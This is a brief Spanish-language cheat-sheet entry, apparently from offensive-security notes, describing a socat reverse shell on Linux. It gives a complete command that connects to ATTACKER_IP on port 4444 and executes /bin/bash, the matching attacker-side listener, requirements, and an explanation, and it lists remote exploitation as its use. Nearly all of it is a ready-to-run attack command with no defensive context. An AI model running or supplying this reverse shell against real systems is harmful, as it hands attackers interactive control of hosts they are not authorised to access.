# Socat Reverse Shell — Bash

## Descripción

Esta variante utiliza socat para ejecutar directamente una shell bash conectada al atacante.

---

# Comando

```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash
```

---

# Listener

```bash
socat TCP-LISTEN:4444,fork -
```

---

# Requisitos

* socat instalado
* bash disponible

---

# Explicación

```
TCP:ATTACKER_IP:4444 → conexión al atacante
EXEC:/bin/bash       → ejecuta bash
```

---

# Cuándo usarlo

* sistemas Linux
* explotación remota

---

# Limitaciones

* requiere bash
